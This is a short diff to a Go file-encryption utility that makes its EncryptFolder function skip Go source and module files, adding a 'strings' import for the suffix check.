@@ -8,6 +8,7 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"strings"
 )
 
 func EncryptFile(filePath string, key []byte) error {
@@ -81,6 +82,9 @@ func EncryptFolder(folderPath string, key []byte) error {
 	for _, entry := range entries {
 		if entry.IsDir() {
 			continue // Skip directories
+		}
+		if strings.HasSuffix(entry.Name(), ".go") || strings.HasSuffix(entry.Name(), ".mod") {
+			continue // Skip Go and module files
 		}
 		filePath := filepath.Join(folderPath, entry.Name())
 		err := EncryptFile(filePath, key)
